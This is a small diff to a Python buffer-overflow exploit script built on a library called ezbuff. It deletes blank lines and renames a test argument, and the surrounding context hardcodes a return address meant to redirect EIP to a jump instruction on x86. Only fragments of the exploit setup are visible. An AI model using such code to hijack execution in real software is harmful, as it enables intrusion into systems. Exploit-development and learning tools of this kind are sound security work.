@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 
-
 from ezbuff.src.overflow import Overflow
-
 
 def main():
 	# Instanstantiate `Overflow` object
@@ -50,8 +48,7 @@ def main():
 	# Set the memory address to jump to after finding valid memory address
 	# containing `jump` instructions set in x86 architecture
 	obj.jump_eip = "\x83\x0c\x09\x10"
-	obj.test("eip_address")
-
+	obj.test("eip")
 
 if __name__ == '__main__':
 	main()
